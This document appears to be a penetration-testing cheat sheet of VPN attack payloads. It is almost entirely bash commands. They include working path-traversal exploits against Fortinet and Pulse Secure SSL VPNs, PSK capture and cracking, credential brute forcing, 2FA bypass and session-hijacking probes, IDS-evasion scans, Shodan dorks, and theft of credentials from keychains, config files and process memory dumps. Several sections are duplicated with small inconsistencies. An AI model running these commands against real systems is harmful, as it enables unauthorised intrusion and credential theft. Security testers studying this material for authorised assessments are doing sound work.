# VPN Attack Payloads

## 1. IKE Enumeration and Fingerprinting

```bash
# Basic IKE discovery scan
ike-scan 192.168.1.1

# Detailed IKE scan with multi-line display
ike-scan -M 192.168.1.1

# Scan VPN gateway with showback
ike-scan --showback -M 192.168.1.1
```

```bash
# IKE fingerprinting to identify vendor
ike-scan -M --showback 192.168.1.1 | grep -i "vid\|vendor\|notify"

# Scan entire subnet for VPN gateways
ike-scan -M 192.168.1.0/24

# IKE scan with custom source port
ike-scan --sport=500 -M 192.168.1.1
```

## 2. Aggressive Mode PSK Cracking

```bash
# Test for aggressive mode (vulnerable to PSK capture)
ike-scan --aggressive -M 192.168.1.1

# Capture aggressive mode handshake with specific transform
ike-scan --aggressive --trans='5,1,2,2' -M 192.168.1.1

# Multiple transform attempts
ike-scan --aggressive --trans='5,1,65001,2' --trans='5,1,2,2' -M 192.168.1.1
```

```bash
# ikeforce dictionary attack on aggressive mode
python3 ikeforce.py 192.168.1.1 -e -t 5 -s 1 -p 2 -r wordlist.txt

# ikeforce with specific ID type
python3 ikeforce.py 192.168.1.1 -e -t 5 -s 1 -p 2 -u ID_IP

# Capture PSK hash for offline cracking
ike-scan --aggressive --trans='5,1,2,2' -M 192.168.1.1 > psk_hash.txt
```

## 3. IKE Transform Set Discovery

```bash
# Enumerate supported encryption algorithms
ike-scan --trans='1,1,1,1' --trans='2,1,1,1' --trans='5,1,1,1' -M 192.168.1.1

# Enumerate hash algorithms
ike-scan --trans='5,1,1,1' --trans='5,1,2,1' --trans='5,2,1,1' -M 192.168.1.1

# Full transform enumeration
ike-scan --trans='5,1,1,1' --trans='5,1,2,1' --trans='5,2,1,1' --trans='5,2,2,1' -M 192.168.1.1
```

```bash
# Enumerate Diffie-Hellman groups
ike-scan --trans='5,1,2,1' --trans='5,1,2,2' --trans='5,1,2,5' -M 192.168.1.1

# IKEv2 transform enumeration
ike-scan -2 --trans='1,1,1,1' --trans='5,1,2,2' -M 192.168.1.1

# Check for weak transforms (DES, MD5)
ike-scan --trans='1,1,1,1' --trans='1,2,1,1' -M 192.168.1.1
```

## 4. VPN Gateway Vulnerability Scanning

```bash
# Nmap VPN service detection
nmap -sU -p 500,4500,1701 --script vpn-service-detection 192.168.1.1

# Nmap IKE script
nmap -sU -p 500 --script ike-version 192.168.1.1

# SSL/TLS testing on VPN web interface
sslscan 192.168.1.1
testssl.sh 192.168.1.1
```

```bash
# Check for common VPN service ports
nmap -sS -sU -p 500,4500,1701,1723,443,1194 192.168.1.1

# Enumerate SSL VPN web interface
nikto -h https://192.168.1.1 -p 443

# Check for default credentials on VPN portal
curl -k -s https://192.168.1.1/remote/logincheck -d "username=admin&password=admin"
```

## 5. SSL VPN Exploitation

```bash
# Fortinet FortiGate path traversal (CVE-2018-13379)
curl -k "https://192.168.1.1/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Pulse Secure file read (CVE-2019-11510)
curl -k "https://192.168.1.1/dana-na/../dana/html5acc/guacamole/../../../../..%252f%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd"

# Palo Alto GlobalProtect (CVE-2020-2021)
curl -k "https://192.168.1.1/global-protect/login.esp"
```

```bash
# Check SSL VPN portal type
curl -k -s -I https://192.168.1.1/ | grep -i "server\|set-cookie"

# Fortinet SSL VPN version detection
curl -k -s https://192.168.1.1/remote/login | grep -i "version\|fortinet"

# Check for Fortinet default SSL VPN certificate
openssl s_client -connect 192.168.1.1:443 2>/dev/null | openssl x509 -noout -subject -issuer
```

## 6. IPSec Tunnel Testing

```bash
# Start strongswan for tunnel testing
sudo ipsec start

# Check IPSec status
sudo ipsec statusall

# Initiate connection
sudo ipsec up vpn-connection

# Verify tunnel established
sudo ipsec status vpn-connection
```

```bash
# strongswan connection profile
cat > /etc/ipsec.conf << 'EOF'
conn test-vpn
    keyexchange=ikev1
    authby=psk
    left=192.168.1.100
    leftid=@client
    right=192.168.1.1
    rightid=@gateway
    rightsubnet=10.0.0.0/24
    ike=aes256-sha1-modp2048
    esp=aes256-sha1
EOF

# Configure PSK
echo "gateway : PSK 'testpassword'" >> /etc/ipsec.secrets
sudo ipsec reload
```

## 7. Certificate-Based VPN Attacks

```bash
# Analyze VPN certificate
openssl s_client -connect 192.168.1.1:443 2>/dev/null | openssl x509 -noout -text

# Extract certificate details
openssl s_client -connect 192.168.1.1:443 2>/dev/null | openssl x509 -noout -subject -issuer -dates -serial

# Check certificate chain validity
openssl s_client -connect 192.168.1.1:443 -showcerts 2>/dev/null | openssl verify -CAfile /etc/ssl/certs/ca-certificates.crt
```

```bash
# Generate self-signed certificate for testing
openssl req -x509 -newkey rsa:2048 -keyout test_key.pem -out test_cert.pem -days 365 -nodes -subj "/CN=test"

# Create PKCS12 keystore for VPN client
openssl pkcs12 -export -out test.p12 -inkey test_key.pem -in test_cert.pem

# Check for expired certificates
echo | openssl s_client -connect 192.168.1.1:443 2>/dev/null | openssl x509 -noout -checkend 0
```

## 8. VPN Credential Brute Force

```bash
# ikeforce XAUTH brute force
python3 ikeforce.py 192.168.1.1 -b -t 5 -s 1 -p 2 -u admin -w passwords.txt

# Hydra against IPSec VPN (XAUTH)
hydra -l admin -P passwords.txt 192.168.1.1 ike

# Custom brute force with ike-scan
for pass in $(cat passwords.txt); do
  ike-scan --aggressive --trans='5,1,2,2' --id="$pass" 192.168.1.1
done
```

```bash
# Brute force VPN web portal
hydra -l admin -P passwords.txt 192.168.1.1 https-post-form "/remote/logincheck:username=^USER^&password=^PASS^:Invalid"

# ikecrack offline PSK cracking
ikecrack-psk.py -h hash.txt -d dictionary.txt

# Custom XAUTH credential testing
for user in admin root guest; do
  for pass in password123 admin123 vpn123; do
    vpnc --gateway 192.168.1.1 --id "$user" --secret "psk" --username "$user" --password "$pass"
  done
done
```

## 9. VPN Tunnel Hijacking

```bash
# Capture VPN traffic for analysis
tcpdump -i any -w vpn_traffic.pcap udp port 500 or udp port 4500 or esp

# Capture ESP packets
tcpdump -i any -w esp_traffic.pcap proto 50

# Analyze captured VPN traffic
wireshark vpn_traffic.pcap

# Display IKE negotiation in wireshark
tshark -r vpn_traffic.pcap -Y "ike || isakmp" -V
```

```bash
# Check for unencrypted traffic in VPN tunnel
tcpdump -i any -w inside_traffic.pcap -n not esp and not udp port 500 and not udp port 4500

# Detect VPN traffic patterns
tshark -r vpn_traffic.pcap -Y "isakmp" -T fields -e ip.src -e ip.dst -e isakmp.type

# Monitor for IKE negotiation failures
tshark -r vpn_traffic.pcap -Y "isakmp.type == 5" -V
```

## 10. Split Tunneling Detection

```bash
# Check routing table for split tunnel
ip route show table all

# Verify VPN routes
ip route get 10.0.0.1

# Test for VPN bypass (traffic outside tunnel)
traceroute 8.8.8.8
tcpdump -i eth0 host 8.8.8.8

# Check if DNS leaks through VPN
nslookup example.com
tcpdump -i eth0 port 53
```

```bash
# Detect split tunneling configuration
ip route | grep -v "tun\|ppp\|ppp0"

# Test for full tunnel vs split tunnel
curl -s https://ifconfig.me
# Compare with VPN interface IP
ip addr show tun0

# DNS leak test through VPN
dig @10.0.0.1 example.com
tcpdump -i tun0 port 53 -c 5
```

## 11. VPN Client Configuration Testing

```bash
# Test vpnc connection
vpnc --gateway 192.168.1.1 --id testuser --secret psk123 --username testuser --password testpass

# vpnc with debug
vpnc --debug 3 --gateway 192.168.1.1 --id testuser --secret psk123

# Disconnect vpnc
vpnc-disconnect

# Test OpenVPN connection
openvpn --config client.ovpn --auth-user-pass credentials.txt
```

```bash
# Analyze VPN profile (.pcf file)
cat vpn_profile.pcf

# Extract PSK from profile
grep -i "shared secret\|psk" vpn_profile.pcf

# Convert Cisco profile to vpnc format
pcf2vpnc vpn_profile.pcf vpnc.conf

# Test strongswan connection
swanctl --load-all && swanctl --initiate --child test
```

## 12. VPN Logging and Detection Avoidance

```bash
# Slow IKE scan to avoid detection
ike-scan --delay=5000 -M 192.168.1.0/24

# Distributed VPN scan across multiple sources
for ip in $(cat targets.txt); do
  ike-scan -M --aggressive --trans='5,1,2,2' $ip 2>/dev/null &
  sleep 2
done

# Low-profile SSL VPN enumeration
curl -k -s --connect-timeout 5 -A "Mozilla/5.0" https://192.168.1.1/remote/login
```

```bash
# Fragmented IKE packets to bypass IDS
ike-scan --cookie --trans='5,1,2,2' -M 192.168.1.1

# IKE with NAT-T encapsulation
ike-scan -2 --nat-t --trans='5,1,2,2' -M 192.168.1.1

# Source port randomization for stealth
ike-scan --sport=$(shuf -i 1024-65535 -n 1) -M 192.168.1.1
```

## 13. OpenVPN Assessment

```bash
# Extract and analyze OpenVPN configuration
openvpn --config client.ovpn --askpass pass.txt --verb 4 2>&1 | tee openvpn_debug.log

# Test OpenVPN with static key mode
openvpn --remote 192.168.1.1 --dev tun --ifconfig 10.8.0.2 10.8.0.1 --secret static.key --verb 4

# OpenVPN TLS-mode connection test
openvpn --config tls-client.ovpn --cert client.crt --key client.key --ca ca.crt --verb 4
```

```bash
# Check for OpenVPN UDP service
nmap -sU -p 1194 --script vpn-service-detection 192.168.1.1

# OpenVPN TCP mode detection
nmap -sS -p 443 --script ssl-cert 192.168.1.1

# Brute force OpenVPN credentials
hydra -l admin -P passwords.txt 192.168.1.1 https-post-form "/index.php:username=^USER^&password=^PASS^:Failed"
```

## 14. WireGuard VPN Assessment

```bash
# Detect WireGuard service on UDP 51820
nmap -sU -p 51820 --script wireguard 192.168.1.1

# Test WireGuard handshake with captured public key
wg --help
wg-quick up wg0 2>&1 | tee wg_debug.log

# WireGuard configuration analysis
cat /etc/wireguard/wg0.conf
wg show wg0
```

```bash
# Generate WireGuard test keys
wg genkey | tee private.key | wg pubkey > public.key

# Attempt WireGuard handshake with known peer
wg set wg0 peer SERVER_PUB_KEY allowed-ips 0.0.0.0/0 endpoint 192.168.1.1:51820
wg show wg0 latest-handshakes

# WireGuard traffic capture for timing analysis
tcpdump -i any -w wg.pcap udp port 51820
```

## 15. VPN High-Availability and Redundancy Testing

```bash
# Discover backup VPN gateways via DNS
dig vpn-backup.example.com +short
dig vpn-dr.example.com +short

# Test failover VPN gateway
ike-scan -M vpn-backup.example.com
curl -k -s -I https://vpn-dr.example.com/remote/login

# Compare active and standby VPN configurations
diff <(ike-scan -M vpn-primary) <(ike-scan -M vpn-backup)
```

```bash
# Load balancer VPN detection
for ip in $(dig +short vpn.example.com); do
  echo "Testing $ip"
  ike-scan -M $ip | head -10
  curl -k -s -o /dev/null -w "HTTP %{http_code}\n" "https://$ip/"
done

# Geo-distributed VPN endpoint enumeration
for region in us-east us-west eu-west ap-south; do
  ike-scan -M vpn-${region}.example.com 2>/dev/null | grep -i "IKE\|VID\|SA"
done
```

## 16. VPN Session Hijacking and Replay

```bash
# Capture and analyze VPN session cookies
tcpdump -i any -w vpn_sessions.pcap 'tcp port 443 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420)'

# Extract session tokens from SSL VPN traffic
tshark -r vpn_sessions.pcap -Y "http.cookie" -T fields -e http.cookie 2>/dev/null

# Test session fixation on SSL VPN portal
curl -k -c cookies.txt -b "DSID=attacker_session" https://192.168.1.1/dana/home/index.cgi
```

```bash
# VPN session timeout testing
# Login and capture session token
SESSION=$(curl -k -s -c - https://192.168.1.1/remote/logincheck -d "username=test&password=test" | grep DSID | awk '{print $NF}')

# Test session after delay
sleep 3600
curl -k -b "DSID=$SESSION" https://192.168.1.1/remote/home 2>/dev/null | grep -i "session\|expire\|timeout"

# Parallel session testing (concurrent login)
for i in $(seq 1 5); do
  curl -k -s -c "session_${i}.txt" https://192.168.1.1/remote/logincheck -d "username=test&password=test" &
done
wait
```

## 17. VPN DNS and Routing Manipulation

```bash
# Test DNS push configuration in OpenVPN
openvpn --config client.ovpn --verb 4 2>&1 | grep -i "PUSH\|DNS\|dhcp-option"

# Check pushed routes
ip route show | grep -i "dev tun\|dev tap"
cat /etc/resolv.conf

# Test for DNS injection via VPN tunnel
dig @10.0.0.1 internal.example.com
dig @8.8.8.8 internal.example.com
```

```bash
# Verify VPN route precedence
ip route show table all | sort -t/ -k2 -n
ip rule show

# Test for routing leaks via source routing
ip route get 10.0.0.1 from $(ip addr show eth0 | grep inet | head -1 | awk '{print $2}')
ip route get 8.8.8.8 from $(ip addr show eth0 | grep inet | head -1 | awk '{print $2}')

# VPN MTU testing and fragmentation attacks
ping -M do -s 1472 10.0.0.1
ping -M do -s 1500 10.0.0.1
```

## 18. VPN Two-Factor Authentication Bypass

```bash
# Test for 2FA bypass on SSL VPN
# Step 1: Authenticate with primary credentials
curl -k -c session.txt https://192.168.1.1/remote/logincheck -d "username=admin&password=admin123"

# Step 2: Skip 2FA page directly
curl -k -b session.txt https://192.168.1.1/remote/home 2>/dev/null | grep -i "welcome\|dashboard"

# Step 3: Test for 2FA enforcement
curl -k -b session.txt https://192.168.1.1/remote/fortisslvpn 2>/dev/null
```

```bash
# Test for 2FA bypass via API endpoints
curl -k -s https://192.168.1.1/remote/info 2>/dev/null | grep -i "two_factor\|mfa\|otp"
curl -k -s -X POST https://192.168.1.1/remote/logincheck -d "username=admin&password=admin123&trustcookie=1"

# Test for remembered device bypass
curl -k -s -b "SVVRTZ=device_trust_token" https://192.168.1.1/dana/home/index.cgi -o response.html
grep -i "welcome\|user\|login" response.html
```

## 19. SSTP and PPTP VPN Assessment

```bash
# Detect SSTP VPN (runs over HTTPS on port 443)
curl -k -s https://192.168.1.1/sra_{BA195980-CDCD-4c44-BDC4-B8896B0F2505}/ -o /dev/null -w "%{http_code}"

# SSTP hello message analysis
curl -k -s -X POST https://192.168.1.1/sra_{BA195980-CDCD-4c44-BDC4-B8896B0F2505}/ss_tp -H "Content-Type: application/octet-stream" -d $'\x00'

# PPTP service detection
nmap -sS -p 1723 --script pptp-version 192.168.1.1
```

```bash
# PPTP GRE protocol analysis
tcpdump -i any -w pptp.pcap 'tcp port 1723 or proto 47'

# PPTP credentials extraction from capture
tshark -r pptp.pcap -Y "pptp" -T fields -e pptp.call_serial_number -e pptp.framing_type 2>/dev/null

# MS-CHAPv2 challenge-response capture for offline cracking
tshark -r pptp.pcap -Y "ppp.chap" -T fields -e ppp.chap.name -e ppp.chap.value 2>/dev/null
```

## 20. L2TP VPN Assessment

```bash
# L2TP service detection on UDP 1701
nmap -sU -p 1701 --script l2tp 192.168.1.1

# L2TP tunnel establishment test
echo "Testing L2TP tunnel..."
xl2tpd -c /etc/xl2tpd/test.conf 2>&1 | tee l2tp_debug.log

# Capture L2TP control and data messages
tcpdump -i any -w l2tp.pcap 'udp port 1701'
```

```bash
# L2TP over IPSec combined capture
tcpdump -i any -w l2tp_ipsec.pcap 'udp port 500 or udp port 4500 or udp port 1701 or proto 50'

# Analyze L2TP session establishment
tshark -r l2tp.pcap -Y "l2tp" -T fields -e l2tp.message_type -e l2tp.session_id -e l2tp.tunnel_id 2>/dev/null

# L2TP configuration file analysis
cat > /etc/xl2tpd/test.conf << 'EOF'
[lac testvpn]
lns = 192.168.1.1
require chap = yes
refuse pap = yes
require authentication = yes
name = testuser
ppp debug = yes
pppoptfile = /etc/ppp/options.l2tp
EOF
```

## 21. VPN Endpoint Correlation and OSINT

```bash
# Discover VPN endpoints via certificate transparency logs
curl -s "https://crt.sh/?q=%.example.com&output=json" | python3 -c "
import json, sys
data = json.load(sys.stdin)
for entry in data:
    name = entry.get('name_value', '')
    if 'vpn' in name.lower() or 'remote' in name.lower():
        print(name)
" | sort -u

# Shodan VPN service discovery
# Search for common VPN service banners
echo "Search Shodan for: port:443 \"Fortinet\" OR \"Pulse Secure\" OR \"GlobalProtect\""
echo "Search Shodan for: port:500 ike"
```

```bash
# DNS reconnaissance for VPN infrastructure
dig AXFR example.com @ns1.example.com 2>/dev/null | grep -i "vpn\|remote\|dial\|ras"

# Reverse DNS lookup for VPN IP ranges
for ip in $(seq 1 254); do
  host 192.168.1.$ip 2>/dev/null | grep -i "vpn\|remote" && echo "192.168.1.$ip"
done

# SPF/TXT record analysis for VPN clues
dig TXT example.com +short | grep -i "vpn\|remote"
```

## 22. VPN Client Exploitation

```bash
# Analyze VPN client binary for hardcoded credentials
strings /usr/bin/vpnclient | grep -i "password\|secret\|key\|token"

# Extract VPN profile from client installation directory
find /opt/vpn* /etc/vpn* /usr/local/vpn* -name "*.pcf" -o -name "*.ovpn" -o -name "*.conf" 2>/dev/null

# Check for stored credentials in keychain
security find-generic-password -s "VPN" ~/Library/Keychains/login.keychain 2>/dev/null
```

```bash
# Dump VPN process memory for credential extraction
gcore $(pgrep -f "openvpn\|vpnc\|strongswan") 2>/dev/null
strings core.* | grep -i "password\|secret\|pass\|psk" | sort -u

# NetworkManager VPN credential extraction
cat /etc/NetworkManager/system-connections/*.vpn 2>/dev/null
grep -i "password\|secret\|psk" /etc/NetworkManager/system-connections/* 2>/dev/null
```

## 23. VPN Traffic Analysis and Data Exfiltration

```bash
# Monitor VPN tunnel data volume for exfiltration detection
ifconfig tun0 | grep "RX bytes\|TX bytes"
watch -n 5 'ifconfig tun0 | grep bytes'

# Detect DNS tunneling through VPN
tcpdump -i tun0 -w dns_tunnel.pcap port 53
tshark -r dns_tunnel.pcap -Y "dns.qry.name.len > 30" -T fields -e dns.qry.name 2>/dev/null
```

```bash
# VPN data flow analysis
iftop -i tun0 -n -P -t -s 30

# Check for covert channels in VPN traffic
tshark -r vpn_traffic.pcap -Y "esp" -T fields -e ip.len -e esp.spi 2>/dev/null | \
  awk '{spi[$2] += $1} END {for (s in spi) print spi[s], s}' | sort -rn | head -10

# Bandwidth analysis per VPN tunnel
vnstat -i tun0
```

## 24. VPN Protocol Downgrade Attacks

```bash
# Test for IKEv1 to IKEv2 downgrade
ike-scan -M 192.168.1.1 > ikev1_response.txt
ike-scan -2 -M 192.168.1.1 > ikev2_response.txt
diff ikev1_response.txt ikev2_response.txt

# Test for weak cipher downgrade in SSL VPN
sslyze --early-data --tlsv1_0 --tlsv1_1 --tlsv1_2 --tlsv1_3 192.168.1.1
```

```bash
# Test protocol version acceptance
for proto in ssl3 tls1 tls1_1 tls1_2 tls1_3; do
  result=$(openssl s_client -connect 192.168.1.1:443 -$proto 2>&1 | grep "Protocol\|Cipher")
  echo "$proto: $result"
done

# Check for DROWN attack (SSLv2 on VPN)
openssl s_client -ssl2 -connect 192.168.1.1:443 2>&1 | grep -i "error\|handshake\|protocol"
```

## 25. SSL VPN Persistent Access

```bash
# Extract and analyze VPN session cookies for persistence
curl -k -c persistent.txt https://192.168.1.1/remote/logincheck -d "username=admin&password=admin"
cat persistent.txt | grep -i "APSCOOKIE\|ccsrftoken\|SVPNONCECOOKIE"

# Test for persistent cookie validation
sleep 86400
curl -k -b persistent.txt https://192.168.1.1/remote/home -o /dev/null -w "%{http_code}\n"
```

```bash
# Check for VPN remember-me functionality
curl -k -c remembered.txt https://192.168.1.1/remote/logincheck -d "username=admin&password=admin&remember=1"

# Test if remembered session survives password change
curl -k -b remembered.txt https://192.168.1.1/remote/home 2>/dev/null | grep -i "welcome\|logout"

# Extract CSRF tokens for automated session maintenance
csrf_token=$(curl -k -s https://192.168.1.1/remote/login | grep -o 'ccsrftoken=[^;]*' | head -1)
echo "CSRF Token: $csrf_token"
```

## 26. VPN Protocol Downgrade Testing

```bash
# Test IKEv1 vs IKEv2 to identify downgrade attack surface
ike-scan -M 192.168.1.1 > ikev1_results.txt 2>&1
ike-scan -2 -M 192.168.1.1 > ikev2_results.txt 2>&1
echo "=== IKEv1 accepted transforms ==="
grep "SA" ikev1_results.txt
echo "=== IKEv2 accepted transforms ==="
grep "SA" ikev2_results.txt

# Test SSL/TLS protocol version downgrade on SSL VPN
for proto in tls1 tls1_1 tls1_2 tls1_3; do
  result=$(openssl s_client -connect 192.168.1.1:443 -$proto 2>&1 | grep "Protocol\|Cipher")
  echo "$proto: $result"
done
```

```bash
# Test for cipher downgrade acceptance on SSL VPN
sslyze --early_data --tlsv1_0 --tlsv1_1 --tlsv1_2 --tlsv1_3 192.168.1.1 2>&1 | grep -E "VULNERABLE|ACCEPTED|REJECTED"

# Check for DROWN attack (SSLv2 on VPN gateway)
openssl s_client -ssl2 -connect 192.168.1.1:443 2>&1 | grep -i "error\|handshake\|protocol"

# Test for BEAST/POODLE via protocol downgrade
testssl.sh --vulns https://192.168.1.1 2>&1 | grep -iE "BEAST|POODLE|DROWN|sweet32"
```

## 27. VPN Infrastructure Mapping and OSINT

```bash
# Certificate transparency log search for VPN-related domains
curl -s "https://crt.sh/?q=%.example.com&output=json" | python3 -c "
import json, sys
data = json.load(sys.stdin)
seen = set()
for entry in data:
    name = entry.get('name_value', '').strip()
    if name and name not in seen and ('vpn' in name.lower() or 'remote' in name.lower()):
        seen.add(name)
        print(name)
"

# Shodan dorking for VPN appliances
echo "Shodan search queries for VPN discovery:"
echo "  port:443 \"Fortinet\" country:US"
echo "  port:443 \"Pulse Secure\" country:US"
echo "  port:443 \"GlobalProtect\" country:US"
echo "  port:443 \"SonicWall\" country:US"
echo "  port:500 ike country:US"
echo "  port:10443 ssl vpn country:US"
```

```bash
# DNS-based VPN infrastructure enumeration
dig AXFR example.com @ns1.example.com 2>/dev/null | grep -iE "vpn|remote|dial|ras|gateway|fw|firewall"
dig TXT example.com +short | grep -iE "vpn|remote"
# SPF and DMARC records may reveal VPN mail relay IPs
dig TXT _dmarc.example.com +short

# Reverse DNS sweep for VPN gateway identification
for ip in $(seq 1 254); do
  result=$(host 203.0.113.$ip 2>/dev/null | grep -iE "vpn|remote|fw|gateway")
  [ -n "$result" ] && echo "203.0.113.$ip: $result"
done
```

## 28. VPN Monitoring and Alerting Assessment

```bash
# Test if VPN gateway generates alerts on failed authentication
# Send 5 rapid authentication failures and check if account locks
for i in $(seq 1 5); do
  curl -k -s -o /dev/null -w "Attempt $i: HTTP %{http_code}\n" \
    https://192.168.1.1/remote/logincheck -d "username=testuser&password=wrong${i}"
done

# Test if 6th attempt shows lockout indication
curl -k -s https://192.168.1.1/remote/logincheck -d "username=testuser&password=wrong6" | \
  grep -iE "lock|disabled|block|too many|attempts"

# Test if VPN gateway logs source IP on failed auth (check via legitimate admin if possible)
# Send failed auth from multiple IPs to test IP-based alerting
for i in $(seq 1 3); do
  curl -k -s --interface "eth0:$i" -o /dev/null -w "Source IP variant $i: HTTP %{http_code}\n" \
    https://192.168.1.1/remote/logincheck -d "username=admin&password=test"
done
```

```bash
# Test VPN session timeout enforcement
# Login and capture session
SESSION=$(curl -k -s -c - https://192.168.1.1/remote/logincheck \
  -d "username=test&password=test" | grep DSID | awk '{print $NF}')
echo "Session obtained: $SESSION"

# Test idle timeout by waiting and checking session validity
echo "Testing 5-minute idle timeout..."
sleep 300
curl -k -b "DSID=$SESSION" https://192.168.1.1/remote/home \
  -o /dev/null -w "After 5min idle: HTTP %{http_code}\n"

# Test absolute session timeout (max session duration)
echo "Testing 8-hour absolute timeout..."
sleep 28800
curl -k -b "DSID=$SESSION" https://192.168.1.1/remote/home \
  -o /dev/null -w "After 8h: HTTP %{http_code}\n"

# Test concurrent session limit
for i in $(seq 1 5); do
  curl -k -s -c "session_${i}.txt" https://192.168.1.1/remote/logincheck \
    -d "username=test&password=test" -o /dev/null -w "Session $i: HTTP %{http_code}\n" &
done
wait
```
